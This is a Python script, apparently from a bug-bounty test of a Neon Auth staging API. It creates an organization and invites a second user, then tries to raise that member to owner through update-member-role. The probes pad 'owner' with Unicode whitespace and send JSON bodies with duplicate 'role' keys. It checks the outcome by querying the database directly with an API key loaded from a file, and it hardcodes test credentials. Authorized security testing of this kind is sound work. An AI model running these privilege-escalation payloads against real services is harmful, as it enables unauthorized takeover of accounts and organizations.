# -*- coding: utf-8 -*-
"""V24b: redo role variants WITH organizationId in body (V24 lacked it).
Target: fresh org + U2 re-invite; DB post-check + cleanup."""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
ctx = ssl.create_default_context()
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
U2 = "libobo1229+na_org2@gmail.com"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, origin="http://localhost:3000",
      raw=None, timeout=25):
    conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
    hdrs = {"Content-Type": "application/json", "Origin": origin,
            "User-Agent": "Mozilla/5.0", "Accept": "application/json"}
    if cookie:
        hdrs["Cookie"] = cookie
    payload = raw.encode() if raw is not None else (json.dumps(body).encode() if body is not None else None)
    conn.request(method, path, payload, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    ck = resp.getheader("Set-Cookie", "")
    conn.close()
    time.sleep(0.25)
    return resp.status, data, ck


def auth(email):
    st, d, ck = na("POST", "/neondb/auth/sign-in/email", {"email": email, "password": PASS})
    return ck.split(";")[0] if st in (200, 201) else None


def main():
    out("== V24b role variants with organizationId ==")
    c1 = auth(U1)
    c2 = auth(U2)
    if not (c1 and c2):
        out("auth fail")
        return
    # fresh org
    st, d, _ = na("POST", "/neondb/auth/organization/create",
                  {"name": "v24b-org", "slug": "v24b%d" % int(time.time())}, c1)
    org = json.loads(d).get("id") if st == 200 else None
    out("org=%s" % org)
    if not org:
        return
    st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                  {"organizationId": org, "email": U2, "role": "member"}, c1)
    out("invite -> %d" % st)
    st, d, _ = na("GET", "/neondb/auth/organization/list-invitations?organizationId=%s" % org, cookie=c1)
    iid = None
    try:
        for i in json.loads(d):
            if i.get("email") == U2 and i.get("status") == "pending":
                iid = i.get("id")
    except Exception:
        pass
    if iid:
        st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation", {"invitationId": iid}, c2)
        out("U2 accept -> %d" % st)
    # DB: memberId + role
    import psycopg
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    conn = http.client.HTTPSConnection("console-stage.neon.build", timeout=30, context=ctx)
    conn.request("GET", "/api/v2/projects/orange-sun-90493739/connection_uri"
                 "?database_name=neondb&role_name=neondb_owner"
                 "&branch_id=br-wandering-field-w2ob6mpn",
                 headers={"X-Bug-Bounty": "xxbo",
                          "Authorization": "Bearer " + json.load(open(r"F:\scan\neon_report\_apikey.json"))["key"]})
    r = conn.getresponse()
    uri = json.loads(r.read().decode())["uri"]
    conn.close()
    p = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(p.query) if k != "channel_binding"]
    uri2 = urlunsplit((p.scheme, p.netloc, p.path, urlencode(q), p.fragment))
    with psycopg.connect(uri2, connect_timeout=15) as dbc:
        dbc.autocommit = True
        with dbc.cursor() as cur:
            cur.execute('SELECT id FROM neon_auth.member WHERE "organizationId"=%s AND "userId"=%s',
                        (org, "66b42c6b-c41e-4c5a-a2fa-aa5957cfaec0"))
            rows = cur.fetchall()
    if not rows:
        out("U2 member row not found")
        return
    mid = str(rows[0][0])
    out("U2 memberId=%s" % mid)
    probes = [
        ("role=owner U+3000", {"organizationId": org, "memberId": mid, "role": "owner\u3000"}),
        ("role=owner NBSP", {"organizationId": org, "memberId": mid, "role": "owner\u00a0"}),
        ("role=owner EM", {"organizationId": org, "memberId": mid, "role": "owner\u2003"}),
        ("role=member ctrl", {"organizationId": org, "memberId": mid, "role": "member"}),
        ("dup o,m", '{"organizationId":"%s","memberId":"%s","role":"owner","role":"member"}' % (org, mid)),
        ("dup m,o", '{"organizationId":"%s","memberId":"%s","role":"member","role":"owner"}' % (org, mid)),
        ("dup o,o ", '{"organizationId":"%s","memberId":"%s","role":"owner","role":"owner "}' % (org, mid)),
    ]
    for tag, b in probes:
        if isinstance(b, str):
            st, data, _ = na("POST", "/neondb/auth/organization/update-member-role",
                             raw=b, cookie=c1)
        else:
            st, data, _ = na("POST", "/neondb/auth/organization/update-member-role",
                             b, cookie=c1)
        out("%-18s -> %s %s" % (tag, st, data[:90]))
    # DB post-check
    with psycopg.connect(uri2, connect_timeout=15) as dbc:
        dbc.autocommit = True
        with dbc.cursor() as cur:
            cur.execute('SELECT role FROM neon_auth.member WHERE id=%s', (mid,))
            out("final U2 role: %r" % (cur.fetchall()[0][0],))
    # cleanup
    st, d, _ = na("POST", "/neondb/auth/organization/delete", {"organizationId": org}, c1)
    out("cleanup -> %s %s" % (st, d[:80]))
    with psycopg.connect(uri2, connect_timeout=15) as dbc:
        dbc.autocommit = True
        with dbc.cursor() as cur:
            cur.execute("DELETE FROM neon_auth.organization WHERE id=%s", (org,))
            cur.execute("DELETE FROM neon_auth.member WHERE \"organizationId\"=%s", (org,))
            cur.execute("DELETE FROM neon_auth.invitation WHERE \"organizationId\"=%s", (org,))
    out("done")


if __name__ == "__main__":
    main()
